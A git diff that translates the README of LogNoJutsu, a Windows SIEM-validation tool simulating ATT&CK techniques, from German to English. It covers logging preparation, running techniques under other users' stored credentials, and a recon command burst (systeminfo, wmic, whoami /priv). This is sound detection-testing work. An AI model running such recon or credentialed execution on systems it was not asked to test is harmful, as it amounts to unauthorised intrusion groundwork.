@@ -1,147 +1,147 @@
 # LogNoJutsu — SIEM Validation & ATT&CK Simulation Tool
 
-## Inhaltsverzeichnis
+## Table of Contents
 
-1. [Was ist LogNoJutsu?](#was-ist-lognojutsu)
-2. [Entstehung und Motivation](#entstehung-und-motivation)
-3. [Funktionsweise](#funktionsweise)
-4. [Systemvoraussetzungen](#systemvoraussetzungen)
-5. [Schnellstart](#schnellstart)
-6. [Web-Oberfläche](#web-oberfläche)
-7. [Systemvorbereitung (Preparation)](#systemvorbereitung-preparation)
-8. [Simulationsphasen](#simulationsphasen)
-9. [Multi-User-Simulation](#multi-user-simulation)
-10. [Exabeam Use Case Abdeckung](#exabeam-use-case-abdeckung)
-11. [Techniken — Vollständige Referenz](#techniken--vollständige-referenz)
+1. [What is LogNoJutsu?](#what-is-lognojutsu)
+2. [Origin and Motivation](#origin-and-motivation)
+3. [How It Works](#how-it-works)
+4. [System Requirements](#system-requirements)
+5. [Quick Start](#quick-start)
+6. [Web Interface](#web-interface)
+7. [System Preparation](#system-preparation)
+8. [Simulation Phases](#simulation-phases)
+9. [Multi-User Simulation](#multi-user-simulation)
+10. [Exabeam Use Case Coverage](#exabeam-use-case-coverage)
+11. [Techniques — Complete Reference](#techniques--complete-reference)
     - [Phase 1: Discovery (Enumeration)](#phase-1-discovery-enumeration)
     - [Phase 2: Attack](#phase-2-attack)
-    - [UEBA-Szenarien (Exabeam)](#ueba-szenarien-exabeam)
-12. [Kampagnen / Playbooks](#kampagnen--playbooks)
-13. [Logging und Reporting](#logging-und-reporting)
-14. [Cleanup-Mechanismus](#cleanup-mechanismus)
-15. [Kommandozeilen-Optionen](#kommandozeilen-optionen)
+    - [UEBA Scenarios (Exabeam)](#ueba-scenarios-exabeam)
+12. [Campaigns / Playbooks](#campaigns--playbooks)
+13. [Logging and Reporting](#logging-and-reporting)
+14. [Cleanup Mechanism](#cleanup-mechanism)
+15. [Command-Line Options](#command-line-options)
 
 ---
 
-## Was ist LogNoJutsu?
+## What is LogNoJutsu?
 
-LogNoJutsu ist ein **SIEM-Validierungswerkzeug**, das reales Angreiferverhalten auf einem Windows-System simuliert. Ziel ist es, nach dem Onboarding einer SIEM-Lösung automatisiert zu überprüfen, ob alle relevanten Detektionen und Use Cases korrekt anschlagen.
+LogNoJutsu is a **SIEM validation tool** that simulates real attacker behavior on a Windows system. Its goal is to automatically verify, after onboarding a SIEM solution, whether all relevant detections and use cases fire correctly.
 
-Das Tool führt **keine echten Angriffe** durch und extrahiert keine Credentials oder sensiblen Daten. Stattdessen werden die Aktionen und Systemartefakte erzeugt, die ein realer Angreifer hinterlassen würde — sprich: die Windows Event Logs, Sysmon-Events und PowerShell-Logs, anhand derer ein SIEM einen Angriff erkennen soll.
+The tool does **not perform real attacks** and does not extract credentials or sensitive data. Instead, it generates the actions and system artifacts that a real attacker would leave behind — specifically: the Windows Event Logs, Sysmon events, and PowerShell logs by which a SIEM should detect an attack.
 
-**Kernprinzip:** Wenn LogNoJutsu eine Technik ausführt und das SIEM diese *nicht* erkennt, liegt ein Problem im SIEM-Onboarding, in der Log-Weiterleitung oder in der Regelkonfiguration vor.
-
----
-
-## Entstehung und Motivation
-
-LogNoJutsu entstand als Open-Source-Eigenentwicklung inspiriert durch **Magneto**, ein internes Tool des SIEM-Herstellers Exabeam. Magneto wird auf Exabeam-Events vorgestellt und steht ausschließlich intern zur Verfügung. Es war in PowerShell geschrieben, startete über eine Executable, bot eine einfache Weboberfläche und führte nach konfigurierbaren Zeitintervallen zunächst kleine Anomalie- und Enumerationsaktionen aus, bevor vollständige Angriffssimulationen abliefen.
-
-LogNoJutsu setzt diese Idee als eigenständiges, erweiterbares Tool um — mit besonderem Fokus auf **Exabeam UEBA-Use-Cases**, aber so gestaltet, dass Standard-ATT&CK-Techniken auch mit anderen SIEM-Lösungen (Splunk, Microsoft Sentinel, IBM QRadar etc.) detektiert werden können.
+**Core principle:** If LogNoJutsu executes a technique and the SIEM does *not* detect it, there is a problem in the SIEM onboarding, log forwarding, or rule configuration.
 
 ---
 
-## Funktionsweise
+## Origin and Motivation
+
+LogNoJutsu was developed as an open-source project inspired by **Magneto**, an internal tool by SIEM vendor Exabeam. Magneto is presented at Exabeam events and is available exclusively internally. It was written in PowerShell, launched via an executable, offered a simple web interface, and executed small anomaly and enumeration actions at configurable time intervals before running full attack simulations.
+
+LogNoJutsu implements this idea as a standalone, extensible tool — with a particular focus on **Exabeam UEBA use cases**, but designed so that standard ATT&CK techniques can also be detected with other SIEM solutions (Splunk, Microsoft Sentinel, IBM QRadar, etc.).
+
+---
+
+## How It Works
 
 ```
 ┌─────────────────────────────────────────────────────────┐
 │  lognojutsu.exe                                         │
 │                                                         │
-│  1. Startet HTTP-Server (localhost:8080)                │
-│  2. Öffnet Web-UI im Browser                           │
-│  3. Wartet auf Benutzerinteraktion — NICHTS läuft       │
-│     automatisch                                         │
+│  1. Starts HTTP server (localhost:8080)                 │
+│  2. Opens Web UI in browser                            │
+│  3. Waits for user interaction — NOTHING runs           │
+│     automatically                                       │
 │                                                         │
-│  Nach Klick auf "Start Simulation":                     │
+│  After clicking "Start Simulation":                     │
 │                                                         │
 │  ┌──────────────┐    ┌──────────────┐    ┌──────────┐  │
 │  │ PREP PHASE   │ →  │ PHASE 1      │ →  │ PHASE 2  │  │
-│  │ (manuell)    │    │ Discovery    │    │ Attack   │  │
-│  │              │    │ (nach T1)    │    │ (nach T2)│  │
+│  │ (manual)     │    │ Discovery    │    │ Attack   │  │
+│  │              │    │ (after T1)   │    │ (after T2)│  │
 │  └──────────────┘    └──────────────┘    └──────────┘  │
 │                                                         │
-│  Jede Aktion wird in .log-Datei protokolliert          │
-│  Am Ende: Cleanup aller angelegten Artefakte            │
+│  Every action is logged to a .log file                 │
+│  At the end: cleanup of all created artifacts           │
 └─────────────────────────────────────────────────────────┘
 ```
 
-Das Tool ist eine **einzelne `.exe`-Datei** (~10 MB). Es werden keine zusätzlichen Laufzeitumgebungen, keine externe Software und keine Internetverbindung benötigt (außer beim automatischen Sysmon-Download während der Vorbereitung).
+The tool is a **single `.exe` file** (~10 MB). No additional runtime environments, external software, or internet connection are required (except for the automatic Sysmon download during preparation).
 
 ---
 
-## Systemvoraussetzungen
+## System Requirements
 
-| Anforderung | Details |
+| Requirement | Details |
 |---|---|
-| Betriebssystem | Windows 10 / Windows 11 / Windows Server 2016+ |
-| Berechtigungen | Normaler Benutzer für Discovery-Techniken; Administrator für Attack-Techniken und Preparation |
-| PowerShell | Version 5.1+ (auf allen modernen Windows-Versionen vorhanden) |
-| Netzwerk | Nur für automatischen Sysmon-Download in der Preparation-Phase erforderlich |
-| SIEM-Agent | Vor dem Start sollte ein Log-Forwarder (Exabeam Agent, Winlogbeat, NXLog etc.) konfiguriert und aktiv sein |
+| Operating System | Windows 10 / Windows 11 / Windows Server 2016+ |
+| Permissions | Regular user for Discovery techniques; Administrator for Attack techniques and Preparation |
+| PowerShell | Version 5.1+ (available on all modern Windows versions) |
+| Network | Only required for automatic Sysmon download during the Preparation phase |
+| SIEM Agent | A log forwarder (Exabeam Agent, Winlogbeat, NXLog, etc.) should be configured and active before starting |
 
 ---
 
-## Schnellstart
+## Quick Start
 
 ```
-# Standard — nur lokal erreichbar:
+# Standard — locally accessible only:
 lognojutsu.exe
 
-# Mit Netzwerkzugriff (SIEM-Engineer konfiguriert von eigenem Laptop):
+# With network access (SIEM engineer configures from own laptop):
 lognojutsu.exe -host 0.0.0.0 -port 8080
 
-# Mit Passwortschutz:
-lognojutsu.exe -host 0.0.0.0 -port 8080 -password "MeinPasswort123"
+# With password protection:
+lognojutsu.exe -host 0.0.0.0 -port 8080 -password "MyPassword123"
 ```
 
-Nach dem Start öffnet man `http://localhost:8080` im Browser. **Es läuft noch keine Simulation.**
+After starting, open `http://localhost:8080` in your browser. **No simulation is running yet.**
 
 ---
 
-## Web-Oberfläche
+## Web Interface
 
-Die Web-UI besteht aus sieben Bereichen:
+The web UI consists of seven sections:
 
-| Tab | Funktion |
+| Tab | Function |
 |---|---|
-| **Dashboard** | Aktueller Simulationsstatus, Phasen-Anzeige, Ausführungs-Timeline, erwartete SIEM-Events |
-| **Preparation** | Einmalige Systemvorbereitung: Audit Policy, PowerShell-Logging, Sysmon-Installation |
-| **Playbooks** | Übersicht aller verfügbaren Kampagnen und Einzeltechniken |
-| **Configure & Run** | Modus wählen (Quick / PoC), Kampagne, Timing, Taktik-Filter, WhatIf-Modus, Benutzer-Rotation, Simulation starten/stoppen |
-| **Results** | Detaillierte Ergebnisse jeder ausgeführten Technik mit Output, Cleanup-Status und ausführendem Benutzer |
-| **Simulation Log** | Live-Log-Stream aller Aktionen mit farbkodierter Ansicht nach Ereignistyp |
-| **Users** | Benutzerprofile verwalten (local/AD), Credentials hinterlegen, Discovery, Credential-Test |
+| **Dashboard** | Current simulation status, phase display, execution timeline, expected SIEM events |
+| **Preparation** | One-time system preparation: Audit Policy, PowerShell Logging, Sysmon installation |
+| **Playbooks** | Overview of all available campaigns and individual techniques |
+| **Configure & Run** | Choose mode (Quick / PoC), campaign, timing, tactic filter, WhatIf mode, user rotation, start/stop simulation |
+| **Results** | Detailed results for each executed technique with output, cleanup status, and executing user |
+| **Simulation Log** | Live log stream of all actions with color-coded view by event type |
+| **Users** | Manage user profiles (local/AD), store credentials, discovery, credential test |
 
 ---
 
-## Systemvorbereitung (Preparation)
+## System Preparation
 
-Vor der ersten Simulation müssen einmalig drei Konfigurationsschritte durchgeführt werden. Diese erfordern **Administratorrechte** und werden über die Web-UI gestartet.
+Before the first simulation, three configuration steps must be performed once. These require **administrator rights** and are initiated via the web UI.
 
 ### 1. PowerShell ScriptBlock Logging
 
-**Was wird konfiguriert:**
-Setzt drei Registry-Schlüssel unter `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell`:
+**What is configured:**
+Sets three registry keys under `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell`:
 
-| Schlüssel | Wert | Zweck |
+| Key | Value | Purpose |
 |---|---|---|
-| `ScriptBlockLogging\EnableScriptBlockLogging` | `1` | Event 4104 aktivieren |
-| `ModuleLogging\EnableModuleLogging` | `1` | Event 4103 aktivieren |
-| `Transcription\EnableTranscripting` | `1` | PowerShell-Transkription aktivieren |
+| `ScriptBlockLogging\EnableScriptBlockLogging` | `1` | Enable Event 4104 |
+| `ModuleLogging\EnableModuleLogging` | `1` | Enable Event 4103 |
+| `Transcription\EnableTranscripting` | `1` | Enable PowerShell transcription |
 
-**Warum wichtig:** Ohne ScriptBlock Logging (4104) sind PowerShell-basierte Angriffe im SIEM praktisch unsichtbar. Dies ist die wichtigste Einstellung für die Erkennung von T1059.001 (79 Exabeam-Regeln), T1027 (47 Regeln) und aller weiteren PowerShell-lastigen Techniken.
+**Why important:** Without ScriptBlock Logging (4104), PowerShell-based attacks are practically invisible in the SIEM. This is the most important setting for detecting T1059.001 (79 Exabeam rules), T1027 (47 rules), and all other PowerShell-heavy techniques.
 
 ### 2. Windows Audit Policy
 
-**Was wird konfiguriert:**
-12 Audit-Subkategorien werden über `auditpol.exe` aktiviert sowie Command-Line-Logging in Event 4688 über einen Registry-Schlüssel:
+**What is configured:**
+12 audit subcategories are enabled via `auditpol.exe` and command-line logging in Event 4688 is enabled via a registry key:
 
-| Subkategorie | Erzeugte Events |
+| Subcategory | Generated Events |
 |---|---|
-| Logon | 4624 (Erfolg), 4625 (Fehler), 4634 (Logoff) |
+| Logon | 4624 (Success), 4625 (Failure), 4634 (Logoff) |
 | Account Lockout | 4740 |
 | Logon — Special Logon | 4672 |
-| Process Creation | 4688 (inkl. Kommandozeile) |
+| Process Creation | 4688 (incl. command line) |
 | Scheduled Task | 4698, 4699 |
 | Security Group Management | 4728, 4732 |
 | User Account Management | 4720, 4726 |
@@ -151,173 +151,173 @@ Setzt drei Registry-Schlüssel unter `HKLM\SOFTWARE\Policies\Microsoft\Windows\P
 | Other Object Access | 4698 |
 | Kerberos Authentication | 4768, 4769, 4771, 4776 |
 
-**Warum wichtig:** Event 4688 mit Kommandozeilen-Logging ist Voraussetzung für die Erkennung von LOLBin-Techniken (T1218, T1059.003). Event 4624/4625/4648 sind Kernvoraussetzungen für alle Credential- und Lateral-Movement-Use-Cases.
+**Why important:** Event 4688 with command-line logging is a prerequisite for detecting LOLBin techniques (T1218, T1059.003). Events 4624/4625/4648 are core prerequisites for all credential and lateral movement use cases.
 
 ### 3. Sysmon Installation
 
-Sysmon (System Monitor) von Sysinternals wird automatisch heruntergeladen und mit einer optimierten Konfiguration installiert. Folgende Event IDs werden konfiguriert:
+Sysmon (System Monitor) from Sysinternals is automatically downloaded and installed with an optimized configuration. The following Event IDs are configured:
 
-| Sysmon Event ID | Beschreibung | Wichtig für |
+| Sysmon Event ID | Description | Important for |
 |---|---|---|
-| **1** | Process Create (mit Hashes, Parent, Cmdline) | Fast alle Techniken |
+| **1** | Process Create (with hashes, parent, cmdline) | Almost all techniques |
 | **3** | Network Connection | T1046 (Port Scan), T1135 (Share Discovery) |
 | **7** | Image Loaded (DLL) | T1218.011 (Rundll32) |
-| **8** | CreateRemoteThread | Injection-Techniken |
-| **10** | ProcessAccess | T1003.001 (LSASS-Zugriff) |
+| **8** | CreateRemoteThread | Injection techniques |
+| **10** | ProcessAccess | T1003.001 (LSASS access) |
 | **11** | FileCreate | T1486 (Ransomware), T1036.005 (Masquerading) |
 | **12/13** | RegistryEvent | T1547.001, T1548.002 (UAC Bypass) |
 | **19/20/21** | WMI Event | T1546.003 (WMI Subscription) |
-| **22** | DNS Query | C2-Kommunikation, T1197 (BITS) |
+| **22** | DNS Query | C2 communication, T1197 (BITS) |
 
 ---
 
-## Simulationsphasen
+## Simulation Phases
 
-### Simulations-Modi
+### Simulation Modes
 
-LogNoJutsu bietet zwei Betriebsmodi:
+LogNoJutsu offers two operating modes:
 
-**Quick Mode** — Einmalige Simulation innerhalb von Minuten/Stunden:
-- T1: Wartezeit vor Phase 1 (0 – 7200s)
-- T2: Pause zwischen Phase 1 und Phase 2 (0 – 7200s)
-- Ideal für schnelle SIEM-Tests und technische Validierung
+**Quick Mode** — One-time simulation within minutes/hours:
+- T1: Wait time before Phase 1 (0 – 7200s)
+- T2: Pause between Phase 1 and Phase 2 (0 – 7200s)
+- Ideal for quick SIEM tests and technical validation
 
-**PoC Multi-Day Mode** — Mehrtägige Simulation für 4-Wochen-PoC mit Exabeam UEBA:
-- Phase 1 läuft N Tage (z.B. 7–14), täglich 2–5 Discovery-Techniken zur UEBA-Baseline-Bildung
-- Anschließend Pause (Gap, konfigurierbar in Tagen)
-- Phase 2 läuft N Tage (z.B. 7–14), täglich eine vollständige Angriffskampagne
-- Ausführung erfolgt täglich zur konfigurierten Uhrzeit (z.B. 09:00)
-- Dashboard zeigt Countdown bis zur nächsten Ausführung
+**PoC Multi-Day Mode** — Multi-day simulation for 4-week PoC with Exabeam UEBA:
+- Phase 1 runs N days (e.g., 7–14), 2–5 Discovery techniques daily for UEBA baseline building
+- Followed by a pause (gap, configurable in days)
+- Phase 2 runs N days (e.g., 7–14), one complete attack campaign per day
+- Execution occurs daily at the configured time (e.g., 09:00)
+- Dashboard shows countdown to next execution
 
 ### Phase 1 — Discovery ("Low & Slow")
 
-Startet nach der konfigurierten Wartezeit T1 (Standard: 5 Sekunden im Test, in Produktion z.B. 10–30 Minuten). Führt alle **10 Enumeration-Techniken** aus (gefiltert nach aktivem Taktik-Filter). Ziel: UEBA-Baseline stören und Recon-Verhalten für Anomalie-Detektionen erzeugen.
+Starts after the configured wait time T1 (default: 5 seconds in test, in production e.g., 10–30 minutes). Executes all **10 enumeration techniques** (filtered by active tactic filter). Goal: disrupt UEBA baseline and generate recon behavior for anomaly detections.
 
 ### Phase 2 — Attack ("Full Attack")
 
-Startet nach Abschluss von Phase 1 + Wartezeit T2 (Standard: 30 Sekunden im Test). Führt die ausgewählte Kampagne oder alle **33 Attack-Techniken** aus (gefiltert nach aktivem Taktik-Filter). Hier entstehen die schwerwiegenden Artefakte (Persistence, Credential Access, Defense Evasion, Exfiltration).
+Starts after Phase 1 completes + wait time T2 (default: 30 seconds in test). Executes the selected campaign or all **33 attack techniques** (filtered by active tactic filter). This is where the serious artifacts are created (Persistence, Credential Access, Defense Evasion, Exfiltration).
 
 ### Cleanup
 
-Nach Ende der Simulation (oder bei manuellem Abbruch) werden alle angelegten Artefakte automatisch entfernt. Details: siehe [Cleanup-Mechanismus](#cleanup-mechanismus).
+After the simulation ends (or on manual abort), all created artifacts are automatically removed. Details: see [Cleanup Mechanism](#cleanup-mechanism).
 
 ---
 
-## Multi-User-Simulation
+## Multi-User Simulation
 
-LogNoJutsu kann Techniken im Sicherheitskontext **anderer Benutzer** ausführen — sowohl lokale Windows-Konten als auch Active-Directory-Domänenbenutzer. Dies ist besonders wertvoll für die Exabeam-UEBA-Validierung, da Exabeam verhaltensbasierte Basislinien pro Benutzer aufbaut und Anomalien erkennt, wenn ein Benutzer ungewöhnliche Aktionen durchführt.
+LogNoJutsu can execute techniques in the security context of **other users** — both local Windows accounts and Active Directory domain users. This is particularly valuable for Exabeam UEBA validation, as Exabeam builds behavioral baselines per user and detects anomalies when a user performs unusual actions.
 
-### Konzept: Benutzerprofile
+### Concept: User Profiles
 
-Ein **Benutzerprofil** in LogNoJutsu besteht aus:
+A **user profile** in LogNoJutsu consists of:
 
-| Feld | Beschreibung |
+| Field | Description |
 |---|---|
-| **Username** | Windows-Benutzername (ohne Domain) |
-| **Domain** | Domain-Name für AD-Benutzer; leer für lokale Konten |
-| **Password** | Passwort — wird verschlüsselt gespeichert (DPAPI) |
-| **User Type** | `local` (lokaler Account), `domain` (AD-Konto), `current` (aktueller Benutzer) |
-| **Display Name** | Optionaler Anzeigename für die UI |
+| **Username** | Windows username (without domain) |
+| **Domain** | Domain name for AD users; empty for local accounts |
+| **Password** | Password — stored encrypted (DPAPI) |
+| **User Type** | `local` (local account), `domain` (AD account), `current` (current user) |
+| **Display Name** | Optional display name for the UI |
 
-Profile werden in `lognojutsu_users.json` im Arbeitsverzeichnis gespeichert. Die Datei ist mit Dateisystem-Berechtigungen `0600` geschützt.
+Profiles are stored in `lognojutsu_users.json` in the working directory. The file is protected with file system permissions `0600`.
 
-### Passwort-Sicherheit: Windows DPAPI
+### Password Security: Windows DPAPI
 
-Passwörter werden **niemals im Klartext** gespeichert. Stattdessen verwendet LogNoJutsu die **Windows Data Protection API (DPAPI)**:
+Passwords are **never stored in plaintext**. Instead, LogNoJutsu uses the **Windows Data Protection API (DPAPI)**:
 
 ```
-Speichern:   PowerShell ConvertFrom-SecureString (ohne Schlüssel = DPAPI Machine+User-Kontext)
-Lesen:       PowerShell ConvertTo-SecureString + SecureStringToBSTR
+Store:  PowerShell ConvertFrom-SecureString (without key = DPAPI Machine+User context)
+Read:   PowerShell ConvertTo-SecureString + SecureStringToBSTR
 ```
 
-DPAPI bindet die Verschlüsselung an den Windows-Benutzer und die Maschine. Das bedeutet: Die `lognojutsu_users.json` kann nicht auf einem anderen System oder mit einem anderen Benutzer entschlüsselt werden.
+DPAPI binds the encryption to the Windows user and machine. This means: the `lognojutsu_users.json` cannot be decrypted on a different system or with a different user.
 
-> **Fallback:** Falls DPAPI nicht verfügbar ist (z.B. in Sandbox-Umgebungen), speichert LogNoJutsu das Passwort mit dem Präfix `PLAIN:`.
+> **Fallback:** If DPAPI is not available (e.g., in sandbox environments), LogNoJutsu stores the password with the prefix `PLAIN:`.
 
-### Ausführungsmechanismus: ProcessStartInfo mit Credentials
+### Execution Mechanism: ProcessStartInfo with Credentials
 
-Wenn eine Technik als anderer Benutzer ausgeführt werden soll, verwendet LogNoJutsu `System.Diagnostics.ProcessStartInfo` mit expliziten Credentials:
+When a technique is to be executed as a different user, LogNoJutsu uses `System.Diagnostics.ProcessStartInfo` with explicit credentials:
 
 ```powershell
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = "powershell.exe"
-$psi.UserName = "DOMAIN\username"    # oder ".\username" für lokale Konten
+$psi.UserName = "DOMAIN\username"    # or ".\username" for local accounts
 $psi.Password = $securePassword
 $psi.UseShellExecute = $false
 $psi.RedirectStandardOutput = $true
 $proc = [System.Diagnostics.Process]::Start($psi)
 ```
 
-**Erzeugte Windows Events:**
+**Generated Windows Events:**
 
-| Event ID | Log | Beschreibung |
+| Event ID | Log | Description |
 |---|---|---|
-| **4648** | Security | *A logon was attempted using explicit credentials* — Kernindikator für RunAs-Verhalten, zentrales Exabeam-UEBA-Signal |
-| **4624** | Security | Erfolgreicher Logon des Zielbenutzers |
-| **4688** | Security | Prozesserstellung mit Command-Line-Logging |
-| **1** | Sysmon | Process Create mit ParentProcess = LogNoJutsu |
+| **4648** | Security | *A logon was attempted using explicit credentials* — core indicator for RunAs behavior, central Exabeam UEBA signal |
+| **4624** | Security | Successful logon of the target user |
+| **4688** | Security | Process creation with command-line logging |
+| **1** | Sysmon | Process Create with ParentProcess = LogNoJutsu |
 
-### Benutzer-Rotation
+### User Rotation
 
-| Modus | Verhalten |
+| Mode | Behavior |
 |---|---|
-| **None** | Alle Techniken laufen als aktueller Benutzer (keine Profile nötig) |
-| **Sequential** | Profile werden der Reihe nach zugewiesen (Technik 1 → User A, Technik 2 → User B, …) |
-| **Random** | Jede Technik bekommt zufällig einen der konfigurierten Profile |
+| **None** | All techniques run as the current user (no profiles needed) |
+| **Sequential** | Profiles are assigned in order (Technique 1 → User A, Technique 2 → User B, …) |
+| **Random** | Each technique randomly receives one of the configured profiles |
 
-### Vollständiger Workflow
+### Complete Workflow
 
 ```
-1. Tab "Users" → Benutzer hinzufügen (oder Discovery nutzen)
-2. Credential-Test durchführen (grüner Haken = OK)
+1. Tab "Users" → Add users (or use Discovery)
+2. Perform credential test (green checkmark = OK)
 3. Tab "Configure & Run"
-4. User Rotation Mode wählen: Sequential oder Random
-5. Gewünschte Profile im Mehrfach-Select markieren (Ctrl+Klick)
-6. Simulation starten
+4. Choose User Rotation Mode: Sequential or Random
+5. Select desired profiles in the multi-select (Ctrl+Click)
+6. Start simulation
 ```
 
 ---
 
-## Ausführungsoptionen
+## Execution Options
 
-### WhatIf-Modus (Vorschau)
+### WhatIf Mode (Preview)
 
-Der **WhatIf-Modus** führt keine Techniken aus, sondern zeigt nur was ausgeführt würde. Ideal für:
-- Planung vor einer Simulation
-- Demos ohne Artefakte
-- Überprüfung des Taktik-Filters
+The **WhatIf mode** does not execute techniques, but only shows what would be executed. Ideal for:
+- Planning before a simulation
+- Demos without artifacts
+- Verifying the tactic filter
 
-Aktivierung: Checkbox „WhatIf-Modus" in Configure & Run. Der Simulations-Log zeigt `[WhatIf] Would run: T1082 — ...` für jede Technik. Am Ende werden JSON- und HTML-Report generiert (mit WhatIf-Badge markiert).
+Activation: Checkbox "WhatIf mode" in Configure & Run. The simulation log shows `[WhatIf] Would run: T1082 — ...` for each technique. At the end, JSON and HTML reports are generated (marked with WhatIf badge).
 
-### Pause zwischen Techniken
+### Pause Between Techniques
 
-Konfigurierbare Wartezeit (Sekunden) nach jeder ausgeführten Technik. Sinnvoll für:
-- Realistisches operationelles Tempo (Attacker-Pacing)
-- SIEM-Korrelationsfenster einhalten
-- Vermeidung zu dichter Event-Bursts
+Configurable wait time (seconds) after each executed technique. Useful for:
+- Realistic operational tempo (attacker pacing)
+- Maintaining SIEM correlation windows
+- Avoiding overly dense event bursts
 
-Empfehlung: 5–30 Sekunden für reale PoC-Simulationen.
+Recommendation: 5–30 seconds for real PoC simulations.
 
-### Taktik-Filter
+### Tactic Filter
 
-Checkboxen für alle 10 ATT&CK-Taktiken ermöglichen gezieltes Ein-/Ausschließen:
+Checkboxes for all 10 ATT&CK tactics allow targeted inclusion/exclusion:
 
-| Anwendungsfall | Filter-Konfiguration |
+| Use Case | Filter Configuration |
 |---|---|
-| Nur Discovery-Events | Alle abwählen, nur `discovery` aktiv |
-| Keine destruktiven Techniken | `impact` abwählen |
-| Nur Credential-Tests | `credential-access` + `privilege-escalation` aktiv |
-| Exfiltrations-Validierung | `exfiltration` + `collection` aktiv |
+| Discovery events only | Deselect all, only `discovery` active |
+| No destructive techniques | Deselect `impact` |
+| Credential tests only | `credential-access` + `privilege-escalation` active |
+| Exfiltration validation | `exfiltration` + `collection` active |
 
-Der Filter wirkt in beiden Modi (Quick + PoC Multi-Day).
+The filter applies in both modes (Quick + PoC Multi-Day).
 
 ---
 
-## Exabeam Use Case Abdeckung
+## Exabeam Use Case Coverage
 
-LogNoJutsu deckt alle drei Exabeam TDIR Use Case Packages mit insgesamt 21 Use Cases ab. Die folgende Tabelle zeigt die Zuordnung:
+LogNoJutsu covers all three Exabeam TDIR Use Case Packages with a total of 21 use cases. The following table shows the mapping:
 
-| Exabeam Use Case Package | Use Case | Abdeckende Techniken |
+| Exabeam Use Case Package | Use Case | Covering Techniques |
 |---|---|---|
 | **Compromised Insiders** | Compromised Credentials | T1110.001, T1110.003, UEBA-SPRAY-CHAIN |
 | | Lateral Movement | T1021.001, T1550.002, T1558.003, T1046, T1135, T1482 |
@@ -334,9 +334,9 @@ LogNoJutsu deckt alle drei Exabeam TDIR Use Case Packages mit insgesamt 21 Use C
 | | Malware | T1547.001, T1053.005, T1543.003, T1197, T1546.003 |
 | | Brute Force | T1110.001, T1110.003, UEBA-SPRAY-CHAIN |
 
-**Exabeam-Regelabdeckung nach Technik (aus Content-Doc):**
+**Exabeam rule coverage by technique (from content documentation):**
 
-| Technik | Exabeam-Regeln | Priorität |
+| Technique | Exabeam Rules | Priority |
 |---|---|---|
 | T1078 Valid Accounts | 304 | via Multi-User + 4648 |
 | T1059 Command & Scripting | 144 | T1059.001 + T1059.003 |
@@ -362,293 +362,292 @@ LogNoJutsu deckt alle drei Exabeam TDIR Use Case Packages mit insgesamt 21 Use C
 | T1135 Network Share Discovery | 12 | T1135 |
 | T1197 BITS Jobs | 6 | T1197 |
 | T1546.003 WMI Subscription | 6 | T1546.003 |
-| T1110.003 Password Spraying | **1** | T1110.003 (Gap-Test) |
+| T1110.003 Password Spraying | **1** | T1110.003 (Gap test) |
 
-> **Gap-Validierung:** Techniken mit wenigen Exabeam-Regeln (T1110.003 = 1 Regel, T1197 = 6, T1546.003 = 6) sind bewusst im Tool enthalten, um Lücken in der SIEM-Konfiguration sichtbar zu machen.
+> **Gap validation:** Techniques with few Exabeam rules (T1110.003 = 1 rule, T1197 = 6, T1546.003 = 6) are intentionally included in the tool to make gaps in SIEM configuration visible.
 
 ---
+## Techniques — Complete Reference
 
-## Techniken — Vollständige Referenz
-
-> **NIST 800-53:** Jede Technik enthält im YAML-Playbook zugeordnete NIST 800-53 Controls (z.B. `AC-3, AU-12, SI-4`). Diese werden in der Web-UI im Tab "Playbooks" in der Spalte **NIST** angezeigt und ermöglichen die Zuordnung der Simulationsergebnisse zu Compliance-Anforderungen.
+> **NIST 800-53:** Each technique contains associated NIST 800-53 controls in the YAML playbook (e.g., `AC-3, AU-12, SI-4`). These are displayed in the web UI in the "Playbooks" tab in the **NIST** column, enabling mapping of simulation results to compliance requirements.
 
 ### Phase 1: Discovery (Enumeration)
 
-Discovery-Techniken laufen in Phase 1 und erzeugen ausschließlich lesende Zugriffe. Sie dienen dazu, Recon-Verhalten für UEBA-Basislinien zu stören und Enumeration-Detektionen zu testen.
+Discovery techniques run in Phase 1 and generate exclusively read-only accesses. They serve to disrupt recon behavior for UEBA baselines and test enumeration detections.
 
 ---
 
 #### T1082 — System Information Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1082](https://attack.mitre.org/techniques/T1082/) |
-| Taktik | Discovery |
-| Exabeam-Regeln | 10 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Exabeam Rules | 10 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Burst von System-Recon-Befehlen in schneller Folge — Exabeam-UEBA-Signal
-systeminfo                        # OS, Domain, RAM, Patches (EID 4688 für systeminfo.exe)
-wmic computersystem get Domain,Manufacturer,Model,UserName  # WMI-Recon (wmic.exe)
-wmic bios get SerialNumber,Manufacturer,SMBIOSBIOSVersion   # Hardware-Fingerprint
-wmic os get Caption,Version,BuildNumber,OSArchitecture      # OS-Details
-reg query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid  # Maschinenidentifikation
-hostname; whoami; whoami /priv    # Benutzerkontext + Privileges
-net config workstation            # Domain, DC, Computername
-ipconfig /all                     # Netzwerkkonfiguration
+# Burst of system recon commands in rapid succession — Exabeam UEBA signal
+systeminfo                        # OS, Domain, RAM, Patches (EID 4688 for systeminfo.exe)
+wmic computersystem get Domain,Manufacturer,Model,UserName  # WMI recon (wmic.exe)
+wmic bios get SerialNumber,Manufacturer,SMBIOSBIOSVersion   # Hardware fingerprint
+wmic os get Caption,Version,BuildNumber,OSArchitecture      # OS details
+reg query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid  # Machine identification
+hostname; whoami; whoami /priv    # User context + privileges
+net config workstation            # Domain, DC, computer name
+ipconfig /all                     # Network configuration
 ```
 
-**Warum das Angreifer tun:** Systeminformationen sind der erste Schritt nach einer Kompromittierung. Die WMIC-Abfragen mit `ComputerSystem`, `BIOS` und `OS` sind besonders charakteristisch — Exabeam wertet den Burst mehrerer Discovery-Tools in kurzer Zeit als UEBA-Anomalie. `MachineGuid` aus der Registry wird für System-Fingerprinting verwendet. `whoami /priv` zeigt vorhandene Privileges für Privilege-Escalation-Planung.
